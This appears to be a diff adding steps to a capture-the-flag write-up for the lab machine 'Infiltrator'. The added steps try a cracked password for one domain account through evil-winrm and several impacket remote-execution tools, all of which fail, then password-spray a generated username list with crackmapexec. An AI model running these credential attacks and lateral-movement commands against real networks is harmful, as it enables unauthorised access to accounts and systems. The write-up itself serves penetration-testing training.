@@ -509,5 +509,107 @@ Password for `l.clark` found: `WAT?watismypass!`
 >
 > The password is at line number 10 mil+ of `rockyou.txt`, and the match was found in 30 seconds
 
-### 3.4. Connect to target
+### 3.4.  Attempt connection to target
 
+#### 3.4.1. [evil-winrm](https://wadcoms.github.io/wadcoms/Evil-WinRM/)
+
+```console
+root@kali:~# evil-winrm -i dc01.infiltrator.htb -u infiltrator.htb/l.clark -p WAT?watismypass!
+
+Evil-WinRM shell v3.7
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+
+Error: Exiting with code 1
+```
+
+**Failed**: `WinRMAuthorizationError` - user likely not allowed to connect via WinRM
+
+#### 3.4.2. [psexec](https://wadcoms.github.io/wadcoms/Impacket-PsExec/)
+
+```console
+root@kali:~# impacket-psexec "infiltrator.htb/l.clark:WAT?watismypass!"@dc01.infiltrator.htb cmd
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Requesting shares on dc01.infiltrator.htb.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+[-] share 'NETLOGON' is not writable.
+[-] share 'SYSVOL' is not writable.
+```
+
+**Failed**: no writable shares - user likely has no permissions on the "executable" shares
+
+#### 3.4.3. [atexec](https://wadcoms.github.io/wadcoms/Impacket-atexec-Creds/)
+
+```console
+root@kali:~# impacket-atexec "infiltrator.htb/l.clark:WAT?watismypass!"@dc01.infiltrator.htb cmd
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[!] This will work ONLY on Windows >= Vista
+[*] Creating task \ZqohwQMn
+[-] rpc_s_access_denied
+```
+
+**Failed**: `rpc_s_access_denied` - user likely has no privilege
+
+#### 3.4.4. [wmiexec](https://wadcoms.github.io/wadcoms/Impacket-WMIExec/)
+
+```console
+root@kali:~# impacket-wmiexec "infiltrator.htb/l.clark:WAT?watismypass!"@dc01.infiltrator.htb cmd
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] SMBv3.0 dialect used
+[-] WMI Session Error: code: 0x80041003 - WBEM_E_ACCESS_DENIED
+```
+
+**Failed**: `WBEM_E_ACCESS_DENIED` - no permissions, again
+
+#### 3.4.5. [dcomexec](https://wadcoms.github.io/wadcoms/Impacket-DCOMExec/)
+
+```console
+root@kali:~# impacket-dcomexec "infiltrator.htb/l.clark:WAT?watismypass!"@dc01.infiltrator.htb cmd
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] SMBv3.0 dialect used
+[-] DCOM SessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+```
+
+**Failed**: `E_ACCESSDENIED` - no permissions, again²
+
+#### 3.5. Checking for password reuse
+
+Prepare the sAMAccountName list:
+
+```sh
+awk '
+  {
+    name = $0
+    split(name, parts, " ")
+    first = tolower(parts[1])
+    last = tolower(parts[2])
+    print substr(first, 1, 1) "." last
+  }
+' names.txt > samaccountnames.txt
+```
+
+Password spraying using `crackmapexec`
+
+```console
+root@kali:~# crackmapexec smb dc01.infiltrator.htb -u samaccountnames.txt -p 'WAT?watismypass!' -d infiltrator.htb
+SMB         dc01.infiltrator.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
+SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\d.anderson:WAT?watismypass! STATUS_ACCOUNT_RESTRICTION
+SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\o.martinez:WAT?watismypass! STATUS_LOGON_FAILURE
+SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\k.turner:WAT?watismypass! STATUS_LOGON_FAILURE
+SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\a.walker:WAT?watismypass! STATUS_LOGON_FAILURE
+SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\m.harris:WAT?watismypass! STATUS_ACCOUNT_RESTRICTION
+SMB         dc01.infiltrator.htb 445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass!
+```
+
+Received `STATUS_ACCOUNT_RESTRICTION` for users `d.anderson` and `m.harris` → this can mean that the password works, just that they have no SMB permissions on the target
